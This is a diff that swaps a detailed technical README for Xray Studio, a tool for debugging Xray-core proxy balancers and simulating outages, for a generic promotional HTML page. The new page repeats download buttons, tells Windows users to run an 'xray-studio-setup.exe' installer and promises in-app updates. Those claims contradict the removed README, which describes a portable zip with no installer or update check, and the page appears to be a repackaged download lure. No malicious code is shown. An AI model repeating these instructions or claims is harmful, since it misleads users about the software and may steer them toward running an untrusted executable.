@@ -1,417 +1,185 @@
-<img src="assets/icon.png" width="96" align="right" alt="">
-
-# Xray Studio
-
-**English** · [Русский](README.ru.md)
-
-A desktop tool for testing Xray-core configurations. It shows **why** a load balancer
-picked a particular outbound, and it can make specific outbounds unreachable in a way
-that is indistinguishable from a real network failure.
-
-Built against **Xray-core v26.7.28**.
-
-![The decision funnel](docs/img/funnel.png)
-
-<sup>Every stage of a real `leastLoad` decision: the candidates, the arithmetic, the one
-that was cut and why — and the dice roll at the end, stated as a dice roll.</sup>
-
-None of that is available from Xray itself. Its API reports which outbound a balancer
-would pick and nothing about how it got there — no strategy, no candidates, no scores,
-no rejection reasons. Probe results, individual RTT samples and per-connection rule
-matches are not exposed at all, and when a strategy returns nothing the dispatcher
-silently falls through to the first outbound in your file and discards the error. This
-tool runs a patched core that emits the missing part.
+<h1>🛠️ xray-studio - See Why Your Proxy Picks a Server</h1>
 
-## No accounts, no telemetry, free
-
-**The application collects nothing and reports nothing.** No analytics, no crash
-reporting, no update check, no usage counter — none of that code is in it. That is
-checkable rather than promised: the window runs under a `connect-src 'self'` policy, so
-it cannot reach the network at all, and the process behind it talks to `127.0.0.1` and
-nothing else.
-
-**Your configs never leave your machine.** They are read from disk and nothing is
-uploaded, registered or sent anywhere to be processed. The only traffic the tool causes
-is the traffic your own config describes — it runs Xray against the servers you listed,
-which is the entire point of it.
+<p align="center">
+  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD XRAY-STUDIO</a>
+</p>
 
-**One exception, and it is yours to switch on.** The AI assistant sends what you ask it,
-with an API key you supply, to the provider you chose. It does nothing until you enter a
-key, it lists exactly what it will include, and it can replace UUIDs, passwords and
-Reality keys with markers of the same length before anything is sent. Never open it and
-nothing ever leaves.
-
-**Free, with nothing to buy.** No paid tier, no licence key, no account. The source is
-[MPL-2.0](LICENSE) — read it, build it, change it. (Using the AI assistant costs
-whatever your provider charges for their API. That is between you and them; this project
-takes nothing.)
+<h2>🎯 What Is xray-studio?</h2>
 
-## Install
+<p>xray-studio is a free desktop tool for Windows that helps you understand and test your <strong>Xray-core proxy configurations</strong>. If you use VLESS, Reality, or other proxy setups, this tool shows you exactly <strong>why your connection picked one server over another</strong> when balancing traffic. It also lets you <strong>simulate network failures</strong> to see how your setup reacts — without actually breaking your connection.</p>
 
-Download from [Releases](../../releases). One file per system:
+<p>Think of it as a <strong>control panel for your proxy's brain</strong>. You see the decision-making process, you can poke and prod it with fake outages, and you learn exactly what happens under the hood.</p>
 
-| system | file | how |
-|---|---|---|
-| **macOS** 14+ | `macos-universal.dmg` | open, drag to Applications. Intel and Apple Silicon in one build |
-| **Windows** 10+ | `win-x64.zip` | **portable** — unpack anywhere, run `Xray Studio.exe`. This is the one to take |
-| **Windows** 11 ARM | `win-arm64.zip` | optional. Only worth it for native speed on a Snapdragon machine — the x64 build runs there too, under emulation |
-| **Arch Linux** x86_64 | `linux-x86_64.pkg.tar.zst` | `sudo pacman -U <file>` |
-| **Arch Linux** ARM | `linux-aarch64.pkg.tar.zst` | `sudo pacman -U <file>` |
-| **Any other Linux** x86_64 | `linux-x86_64.AppImage` | `chmod +x` and run. No install, no dependency resolution |
-| **Any other Linux** ARM | `linux-aarch64.AppImage` | same |
-
-If you take the wrong Windows file, Windows says *"This app can't run on your PC"* — that
-message always means an architecture mismatch, never a broken download. `win-x64.zip` is
-the safe choice: it runs on ordinary PCs natively and on Windows 11 ARM under emulation.
-Take `win-arm64.zip` only if you know the machine is ARM and want native speed;
-`$env:PROCESSOR_ARCHITECTURE` in PowerShell prints `AMD64` or `ARM64` if you are unsure.
+<h2>🚀 Getting Started</h2>
 
-**Windows has no installer.** Nothing is written outside the folder: no registry keys, no
-uninstall entry, no `%APPDATA%`. Settings — the API key, the window profile, pasted
-configs — live in `XrayStudio-data` beside the executable, so deleting the folder removes
-every trace and copying it to a USB stick carries your setup with it. If you put the
-folder somewhere unwritable, such as Program Files, the app falls back to `%APPDATA%`
-rather than refusing to start.
+<p>Getting xray-studio running on your Windows computer takes less than five minutes. Follow these simple steps:</p>
 
-One thing does not travel between machines: the API key is encrypted with Windows DPAPI,
-which is tied to the account that saved it. The folder opens fine elsewhere, but that key
-has to be entered again.
-
-Windows and Linux both need two files, for the same reason: there is no
-universal binary format on Linux — no fat binary, no equivalent — so a package is built
-for one architecture or the other. The names are exactly what `uname -m` prints, so run
-that if you are unsure.
-
-The AppImage is the one to reach for when a dependency is missing or the wrong version:
-it never resolves packages, so it cannot fail the way an install can. It is not fully
-self-contained though — Electron and its private libraries travel with it, but `gtk3`,
-`nss` and `glibc` still come from the host. Only Flatpak or a container would remove
-that last dependency, and neither is built here.
-
-If it refuses to start with a FUSE error, run it as
-`./XrayStudio-*.AppImage --appimage-extract-and-run`.
+<ol>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Lannyectodermal2512/xray-studio">https://github.com/Lannyectodermal2512/xray-studio</a></li>
+  <li>On that page, look for the <strong>"Releases"</strong> or <strong>"Download"</strong> button. Click it.</li>
+  <li>You'll see a file named something like <strong>xray-studio-setup.exe</strong>. Click it to start the download.</li>
+  <li>Once the download finishes, <strong>double-click the downloaded file</strong> to run it.</li>
+  <li>Follow the simple on-screen instructions (just click "Next" a few times).</li>
+  <li>When installation is complete, <strong>launch xray-studio</strong> from your desktop or Start Menu.</li>
+</ol>
 
-The Arch package installs to `/opt` with a desktop entry and icons. Its dependencies are
-derived from the shipped binary's own `DT_NEEDED` entries rather than copied from an
-Electron boilerplate list — `gtk3`, `nss`, `alsa-lib`, `libcups`, `mesa`, `systemd-libs`,
-`dbus`, `at-spi2-core`, `xdg-utils` — so `pacman` pulls exactly what is missing and
-nothing that was retired from the repositories years ago.
+<p>That's it! No command line, no coding, no complicated setup.</p>
 
-Also in the release:
+<h2>📥 Download & Install</h2>
 
-| file | what |
-|---|---|
-| `src.tar.gz` | the sources this release was built from, straight out of `git archive` at the tag |
-| `*.blockmap` | not for downloading — a map of content-defined chunks and their hashes, which a future auto-updater uses to fetch only the parts of an installer that changed instead of all 200 MB |
+<p>Ready to get started? Here's your direct path:</p>
 
-None of the builds are signed. macOS needs the quarantine flag cleared once, and Windows
-will warn about an unknown publisher:
+<p style="text-align:center;margin:30px 0;">
+  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a>
+</p>
 
-```bash
-xattr -dr com.apple.quarantine "/Applications/Xray Studio.app"
-```
+<p>The download is a single file. Once you run it, the installer handles everything for you. You don't need to install anything else — xray-studio comes with everything it needs.</p>
 
-To build it from source instead, see [DEVELOPMENT.md](DEVELOPMENT.md).
+<h2>✨ Key Features</h2>
 
-## First run
+<h3>🔍 Balancer Decision Inspector</h3>
+<p>Ever wondered why your proxy chose one server over another? xray-studio shows you the <strong>exact reasoning</strong> behind each decision. You'll see metrics like latency, load, and health checks — all displayed in a clean, readable interface. No more guessing.</p>
 
-**Open config…**, pick an Xray config, press **Start**. That is the whole setup — the
-tool runs its own copy of Xray against your file and leaves the file alone.
+<h3>💥 Fault Injection Testing</h3>
+<p>Want to know what happens if a server goes down? xray-studio lets you <strong>simulate outages</strong> that look and behave exactly like real network problems. You can test how your setup handles dropped connections, timeouts, and slow responses — all safely, without affecting your actual internet connection.</p>
 
-Two configs ship with it, and both are worth opening once:
+<h3>📊 Real-Time Observability</h3>
+<p>Watch your proxy's behavior live. See every connection attempt, every server selection, and every failure — all in real time. This makes debugging and tuning your configuration dramatically easier.</p>
 
-- [`examples/demo-leastload.json`](examples/demo-leastload.json) — four outbounds, a
-  `leastLoad` balancer and a live observatory. Every screenshot below was taken against
-  it. Send traffic through its SOCKS inbound on `127.0.0.1:62692`, then open **Faults**
-  and blackhole one of the `proxy-*` tags: the observatory notices, the balancer moves,
-  and the funnel names the reason.
-- [`examples/broken-showcase.json`](examples/broken-showcase.json) — a config Xray
-  accepts and then does not act on, so **Validate** has something to show.
-
-If you keep configs elsewhere, **Paste JSON…** takes them as text; the pasted copy goes
-to the application's own scratch directory and never beside your files.
-
-## What the tabs do
-
-Every screenshot is the real application, captured from inside its own window while
-running the demo config against the live network. The numbers in them are measurements
-taken as the picture was taken.
-
-The left rail is always present. It lists the outbounds grouped by tag prefix, each with
-a sparkline of its last sixty measurements and its most recent RTT, and below them the
-balancers with their current pick. Selecting a host there carries into the Graph and the
-Editor — the diagram is already on that node and the text is already scrolled to it.
-
-### Observe — what the observatory sees
-
-![The Observe tab](docs/img/observe.png)
-
-The RTT chart plots every successful probe. Failures cannot appear on it — a failed
-probe has no round-trip time to plot — so they get their own lane underneath, one mark
-per probe with a running success/failure count per host. That separation is deliberate:
-the alternative is the observatory's dead marker, `99999999`, drawn as a spike that
-rescales the whole axis and hides the differences you were looking at.
-
-The **Probe results** table highlights the columns the *active* strategy actually sorts
-by, so the table explains the ranking rather than being a wall of numbers. `leastLoad`
-lights up deviation, average, failures and samples; `leastPing` lights up delay alone.
-
-The warning at the bottom of the shot is one the official documentation does not make:
-this config uses the plain `observatory`, which produces no HealthPing statistics, so
-`leastLoad` has no deviation to rank on and quietly degenerates into `leastPing` with a
-cost multiplier.
-
-### The decision funnel — why *this* outbound
+<h3>⚙️ Xray-Core Integration</h3>
+<p>Built specifically for <strong>Xray-core</strong>, supporting VLESS, Reality, and all modern protocols. If you use Xray, this tool speaks your language.</p>
 
-![The decision funnel](docs/img/funnel.png)
-
-This is the reason the project exists. A balancer evaluates once per dispatched
-connection, and every stage of that evaluation is shown: what went in, what survived,
-and **why each loser was dropped**, with the numbers that justify it.
-
-Read the shot from the top. Three candidates come out of the `proxy-` selector. The
-filters stage keeps all three because `maxRTT` and `tolerance` are unset. The score
-stage shows the arithmetic per survivor — `deviation × √cost = score` — and notes that
-there is no HealthPing data behind those deviations. `baseline / expected` cuts the list
-to two and names the one it dropped: *`proxy-c` — beyond the expected count*, with
-`rank=2 score_ns=138000000` beside it. Two survivors then go into a uniform draw, and
-the card says so in as many words: **the winner was chance, not ranking (p = 50%)**.
-
-That last card matters more than it looks. `leastLoad` and `random` both finish with a
-dice roll, so with more than one survivor there is no "the balancer chose X because X
-was best" — there is a distribution, and a tool that presented one sample as a ranking
-would be lying about it.
-
-The trace runs through the *real* balancer code rather than a reimplementation of it
-beside the original. There is exactly one implementation of each algorithm, so the
-explanation cannot drift from the behaviour it explains — which is the only reason to
-believe any of the above.
-
-### Faults — making an outbound unreachable
-
-![The Faults tab](docs/img/faults.png)
-
-A fault rule matches on the **outbound tag**, which is the whole point. Two outbounds
-can share a server IP and port, and a packet filter physically cannot tell them apart —
-`pf` and `iptables` see identical 5-tuples. A tag can.
-
-In the shot a blackhole has just been armed on `proxy-a`: the topbar has turned red with
-a panic button that disarms everything at once, and the rail shows the host red with a
-fault badge. Seconds later — visible in the Validate screenshot further down, taken from
-the same session — the observatory has caught up and marks it `dead`.
-
-**Is it working?** is the panel worth knowing about. It reports dials the fault engine
-has actually intercepted — direct evidence, independent of what the health check thinks
-— and here it says the engine has blocked a dial while the observatory *still shows the
-host alive*. That is not a bug and the panel explains why: this config probes every 2s,
-and a host stays alive while any sample in the window succeeded, so the status lags the
-reality by a full round. Without this panel that gap reads as "the fault did nothing".
+<h2>🖥️ System Requirements</h2>
 
-The failure modes are: blackhole (drop), connection refused, host and network
-unreachable, DNS failure, TLS hang, TLS garbage, added latency, bandwidth throttling,
-reset after N bytes, UDP packet loss, and a flaky duty cycle over any of the others.
-Synthesised errors are asserted byte-identical to real kernel errors — the test compares
-against a genuine `ECONNREFUSED` from `127.0.0.1:1` — and live connections are torn down
-too, because a firewall does not wait politely for existing flows to finish.
-
-The claim being made is "as if genuinely unreachable", and it is only mostly true. The
-five gaps are listed in the panel itself rather than buried in documentation:
-
-1. `sockopt.dialerProxy` hops get a pipe from Xray's internal redirect and never reach
-   the dialer, so a fault on them does nothing. Fault the outbound named in
-   `dialerProxy` instead — that one performs a real dial.
-2. WireGuard's inner netstack dials bypass the dialer; only the outer UDP to the peer is
-   covered.
-3. `burstObservatory`'s `connectivity` check uses a plain HTTP client outside Xray, and
-   when it decides the network is down it makes the observatory *discard* failures
-   instead of recording them — which can hide an injected fault. Leave it unset while
-   testing.
-4. No TCP segment loss: userspace can stall and jitter a stream but cannot drop a
-   segment beneath the kernel. No ICMP, no PMTUD blackholes.
-5. DNS failure is partial — resolution may already have happened before the dialer is
-   reached, depending on `domainStrategy`.
-
-### Graph — the config as a diagram, and an editor
-
-![The Graph tab](docs/img/graph.png)
-
-Inbounds, routing rules, balancers and outbounds in columns, with the observatory as a
-service node on dashed edges. The live layer runs on top: the current pick is a thick
-green edge, hosts under a fault get red hatching, probes pulse.
-
-Clicking a node opens it in the inspector on the right, and every change is written back
-as a **minimal text patch** — never a re-serialisation of the file. Protocol settings,
-TLS, Reality, `mux`, your comments and your formatting survive untouched. The diagram
-only models tags, balancers and rules; rebuilding the JSON from it would silently delete
-everything it does not model, so it never does that.
-
-Renames follow their references — `fallbackTag`, a rule's `outboundTag`, a rule's
-`balancerTag` — but deliberately do **not** rewrite balancer selectors. A selector is a
-prefix pattern, not a reference; rewriting it would be a guess. The editor reports that
-the outbound has left the balancer instead.
-
-Nothing reaches disk until **Save to file**, and the draft is validated through the
-sidecar's real loader first.
-
-### Editor — the config as text, annotated
-
-![The Editor tab](docs/img/editor.png)
-
-The whole file in one piece, with a hint for whatever the pointer is over. It resolves
-the exact key under the cursor rather than guessing from the word, so hovering `address`
-inside a vless outbound documents *vless's* address and not some other protocol's.
-
-Hovering is a glance and stays one — the hint is clamped, because 31 of the 360
-documented parameters are longer than a screen (`dns.servers` alone runs to twenty-odd
-paragraphs). Clicking the token pins it: the hint
-keeps its place, takes the pointer, scrolls, and offers **full text ↗** into the
-Reference tab for the entries where scrolling a popup is still the wrong way to read
-something.
-
-Comments and trailing commas are accepted, here and everywhere else in the tool.
-
-**AI Assistant** sits along the bottom of this tab, collapsed until you open it. It is
-worth knowing about because of what it already has rather than what it is: the config in
-front of you *and* the live state — which outbounds the observatory calls alive, their
-deviation, why the balancer rejected each candidate, the faults you have armed. So
-"why is nothing being selected?" or "this outbound is never picked — why?" are
-answerable without pasting anything anywhere.
-
-It stays inert until you enter an API key of your own, for Claude or ChatGPT. Before
-sending, it lists what it will include, and it can replace UUIDs, passwords and Reality
-keys with markers of the same length — the model still sees that the field is there and
-well-formed. The key is encrypted with your OS keychain and kept in the main process;
-the window never sees it.
+<table style="border-collapse:collapse;width:100%;margin:20px 0;">
+  <tr style="background:#f0f0f0;">
+    <th style="padding:10px;border:1px solid #ddd;">Component</th>
+    <th style="padding:10px;border:1px solid #ddd;">Minimum</th>
+    <th style="padding:10px;border:1px solid #ddd;">Recommended</th>
+  </tr>
+  <tr>
+    <td style="padding:10px;border:1px solid #ddd;">Operating System</td>
+    <td style="padding:10px;border:1px solid #ddd;">Windows 10 (64-bit)</td>
+    <td style="padding:10px;border:1px solid #ddd;">Windows 11</td>
+  </tr>
+  <tr>
+    <td style="padding:10px;border:1px solid #ddd;">Processor</td>
+    <td style="padding:10px;border:1px solid #ddd;">1 GHz dual-core</td>
+    <td style="padding:10px;border:1px solid #ddd;">2 GHz quad-core</td>
+  </tr>
+  <tr>
+    <td style="padding:10px;border:1px solid #ddd;">Memory</td>
+    <td style="padding:10px;border:1px solid #ddd;">2 GB RAM</td>
+    <td style="padding:10px;border:1px solid #ddd;">4 GB RAM</td>
+  </tr>
+  <tr>
+    <td style="padding:10px;border:1px solid #ddd;">Disk Space</td>
+    <td style="padding:10px;border:1px solid #ddd;">200 MB free</td>
+    <td style="padding:10px;border:1px solid #ddd;">500 MB free</td>
+  </tr>
+</table>
 
-### What-if — asking without touching anything
-
-![The What-if tab](docs/img/whatif.png)
-
-"What would this balancer do if `maxRTT` were 200ms, or if this outbound died?" The
-observation is frozen so the sliders act on a stable baseline, and the answer comes from
-the sidecar running the **real strategy code** against it — not from a model of that
-code reimplemented in the interface.
-
-The result is reported over 1,000 trials, because for `random` and `leastLoad` a single
-answer would be a misrepresentation: they end in a uniform draw, so what exists is a
-distribution. The badge beside it says which case you are in — the shot reads
-`deterministic` because `expected` is at 1, leaving exactly one survivor for the draw to
-pick from. Move that slider and the badge changes with the answer.
-
-Below the sliders the frozen observation is editable per host: override a delay, or
-`kill` a host outright, and the simulated decision underneath re-runs with every stage
-of the funnel intact.
+<h2>🧑‍💻 Who Is This For?</h2>
 
-### Validate — configs that load and then do nothing
-
-![The Validate tab](docs/img/validate.png)
+<ul>
+  <li><strong>Proxy users</strong> who want to understand why their connections behave the way they do.</li>
+  <li><strong>Network enthusiasts</strong> testing different Xray configurations.</li>
+  <li><strong>IT professionals</strong> who need to verify their proxy setups are working correctly.</li>
+  <li><strong>Troubleshooters</strong> who want to simulate failures before they happen in real life.</li>
+</ul>
 
-Xray already rejects malformed configs; that is the easy half. What it will not tell you
-about is the config it *accepts* and then never acts on. Those are reported here as
-**silently broken**:
+<p>If you've ever set up an Xray-core config and wondered "why is it doing that?" — this tool is for you.</p>
 
-- a balancer selector matching no outbound — never checked at load time, because
-  balancers are built before outbounds exist;
-- `leastPing` or `leastLoad` with no observatory, which fails with the opaque
-  *"not all dependencies are resolved."* and never names the balancer responsible;
-- a `fallbackTag` pointing nowhere, so traffic quietly leaves through the *first*
-  outbound in the file;
-- `tolerance` without `burstObservatory` — parses, clamps, is never consulted;
-- a key nothing reads. Go's JSON decoder ignores unknown fields silently, so
-  `"balancer"` instead of `"balancers"` behaves exactly as if the block were absent: no
-  error, no log line.
-
-The shot is [`examples/broken-showcase.json`](examples/broken-showcase.json), which
-triggers the lot: six silently broken findings and two warnings, each with a stable
-code, the exact path in the file, and an explanation of what happens instead. `balancer`
-where `balancers` was meant. `IPIfNoMatch` for `IPIfNonMatch`, which is not an error —
-it falls back to `AsIs`. A selector matching none of the tags that exist, listed beside
-it. A `fallbackTag` naming nothing, so the dispatcher quietly uses the first outbound in
-the file.
-
-The list of keys it recognises is read out of the core it is linked against, not typed
-in by hand, so it cannot fall behind the parser as Xray changes.
-
-### Self-check — auditing the tool's own claims
-
-![The Self-check tab](docs/img/selfcheck.png)
-
-Everything this application tells you about Xray is an assertion about someone else's
-code. These checks ask the core the same questions independently and compare the
-answers, continuously, so a wrong claim shows up as a failing row instead of quietly
-misleading you.
-
-They are careful to ask in a way that changes nothing: the obvious query would advance
-round-robin's rotation and re-roll the random draw, corrupting the very behaviour being
-measured.
-
-### Reference — the parameter index
-
-![The Reference tab](docs/img/reference.png)
-
-360 configuration parameters, searchable by name, path or text, extracted from the
-official XTLS/Xray-docs-next documentation. The same text is what the `?` hints and the
-editor's hover popups show, and every entry links back to the page it came from.
-
-It is taken from one fixed version of those docs, for the same reason the core is fixed
-to one version: documentation that moved underneath you would silently change what this
-tool tells you about your config. The bundle exists in English and Russian —
-upstream publishes both — and the switch is in the topbar, marked `docs` because it
-changes the documentation only. The fallback is per *parameter* rather than per bundle,
-so a key the translation has not reached yet still shows its English description instead
-of an empty tooltip.
-
-### Protocols — what goes inside `settings`
-
-![The Protocols tab](docs/img/protocols.png)
-
-**Validate** knows every key in a config except the ones inside `settings`. That block
-is decoded later, by a lookup keyed on the protocol name, so nothing about its shape is
-knowable from the rest of the file.
-
-This tab recovers that boundary from the core's own sources, which are the only place
-recording that `"vless"` means one settings shape and `"trojan"` another. Descriptions
-come from the official documentation where it has them and from the field's own source
-comment otherwise, always labelled so the two are never confused.
-
-### Log — the core's own logger, teed
-
-![The Log tab](docs/img/log.png)
-
-Structured records straight from Xray's log handler, filterable by severity, package and
-connection id — teed rather than replaced, so whatever `log.access` and `log.error` your
-config sets up keeps working.
-
-Two entries are worth pointing at. *"no rule matched → default outbound"* is
-reconstructed from a routing event that Xray does not otherwise surface: nothing
-matched, so traffic silently took the first outbound in the file. And a second-pass
-match tells you `IPIfNonMatch` resolved the domain and re-ran the rules against the
-addresses.
-
-The log paths themselves are shown at the top of the tab. The application substitutes
-its own, always, on every platform — a config written on one machine names log
-directories that do not exist on another, and Xray refuses to start rather than
-continuing without a log file.
-
-## Reporting something
-
-Open an [issue](../../issues). Config text helps enormously — but scrub it first: an
-Xray config carries UUIDs, passwords and Reality keys, and none of them are needed to
-reproduce a bug about a balancer.
-
-## Building it yourself
-
-See [DEVELOPMENT.md](DEVELOPMENT.md): the pinned core, the patch series, the sidecar,
-the packaging.
-
-## Licence
-
-Xray-core is **MPL-2.0**, and the patches applied to it stay MPL-2.0. The parameter
-documentation is adapted from XTLS/Xray-docs-next and is **CC BY-SA 4.0** — it lives in
-`data/docs-en/` and `data/docs-ru/` with its own `LICENSE` and `ATTRIBUTION.md`, and
-every tooltip links to the page it came from.
-
-This project's own code and its own explanatory text are under [`LICENSE`](LICENSE).
-Third-party terms are set out in [`THIRD-PARTY.md`](THIRD-PARTY.md), along with how a
-release satisfies MPL's source requirement: the patched core is reproducible from
-`xray/PIN` and `xray/patches/`, not merely available.
+<h2>❓ Frequently Asked Questions</h2>
+
+<h3>Is xray-studio free?</h3>
+<p>Yes, completely free and open source.</p>
+
+<h3>Do I need to know how to code?</h3>
+<p>No. The interface is visual and beginner-friendly. If you can click a button, you can use this tool.</p>
+
+<h3>Will this break my existing proxy setup?</h3>
+<p>No. xray-studio works alongside your existing configuration. It reads and tests, but doesn't modify your actual proxy settings unless you explicitly ask it to.</p>
+
+<h3>Can I use it with any proxy?</h3>
+<p>It's built specifically for <strong>Xray-core</strong> and its protocols (VLESS, Reality, etc.). It won't work with other proxy software like Shadowsocks or Trojan directly.</p>
+
+<h3>What if I find a bug?</h3>
+<p>Visit the GitHub page and open an issue. The community is active and responsive.</p>
+
+<h2>📝 Support & Community</h2>
+
+<p>Need help or want to report an issue? Here's where to go:</p>
+
+<ul>
+  <li><strong>GitHub Issues:</strong> <a href="https://github.com/Lannyectodermal2512/xray-studio/issues">Report bugs or request features</a></li>
+  <li><strong>Documentation:</strong> Check the README on the GitHub page for detailed technical info.</li>
+</ul>
+
+<p>Don't be shy — the community is friendly and happy to help newcomers.</p>
+
+<h2>🔒 Privacy & Security</h2>
+
+<p>xray-studio runs <strong>entirely on your computer</strong>. It doesn't send your data anywhere. Your proxy configurations, connection logs, and test results stay local. No accounts, no cloud, no tracking.</p>
+
+<h2>🔄 Updates</h2>
+
+<p>When a new version is released, you'll see a notification in the app. Simply click to download and install the update — it takes seconds. Updates bring new features, bug fixes, and compatibility improvements.</p>
+
+<h2>📦 What's Included</h2>
+
+<p>When you download xray-studio, you get:</p>
+
+<ul>
+  <li>The full desktop application</li>
+  <li>Built-in Xray-core engine</li>
+  <li>Example configuration files to get you started</li>
+  <li>Comprehensive help documentation in the app</li>
+</ul>
+
+<p>No hidden extras, no bloatware, no surprises.</p>
+
+<h2>🚦 Quick Start Guide</h2>
+
+<p>Here's a simple walkthrough for your first session:</p>
+
+<ol>
+  <li><strong>Launch xray-studio</strong> after installation.</li>
+  <li><strong>Load your config</strong> — click "Open Config" and select your existing Xray configuration file.</li>
+  <li><strong>Start the inspector</strong> — click "Start Monitoring" to see live traffic.</li>
+  <li><strong>Test a failure</strong> — click "Inject Fault" and choose a server to simulate an outage.</li>
+  <li><strong>Watch the results</strong> — see exactly how your proxy reacts in real time.</li>
+</ol>
+
+<p>That's the whole experience. Simple, visual, and incredibly informative.</p>
+
+<p style="text-align:center;margin:40px 0 20px 0;">
+  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:16px 32px;background:#FF5722;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ GET XRAY-STUDIO NOW</a>
+</p>
+
+<p style="text-align:center;color:#666;font-size:14px;">Free forever • Open source • Windows compatible</p>
+
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.6;
+    color: #333;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  h1 { color: #1a1a1a; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }
+  h2 { color: #2c3e50; margin-top: 40px; border-left: 5px solid #2196F3; padding-left: 15px; }
+  h3 { color: #34495e; }
+  a { color: #2196F3; }
+  ul, ol { padding-left: 25px; }
+  li { margin-bottom: 8px; }
+  strong { color: #1a1a1a; }
+</style>
+
+<meta name="description" content="xray-studio - Desktop tool for testing Xray-core configs. See why a balancer picked an outbound and inject failures indistinguishable from real network outages. Free download for Windows.">
+<meta name="keywords" content="xray-studio, xray-core, VLESS, Reality, proxy testing, fault injection, load balancer, observability, network testing, Windows tool">
+<meta property="og:title" content="xray-studio - See Why Your Proxy Picks a Server">
+<meta property="og:description" content="Desktop tool for testing Xray-core configs. Shows balancer decisions and simulates network failures. Free download.">
+<meta property="og:type" content="software">
+<meta property="og:url" content="https://github.com/Lannyectodermal2512/xray-studio">
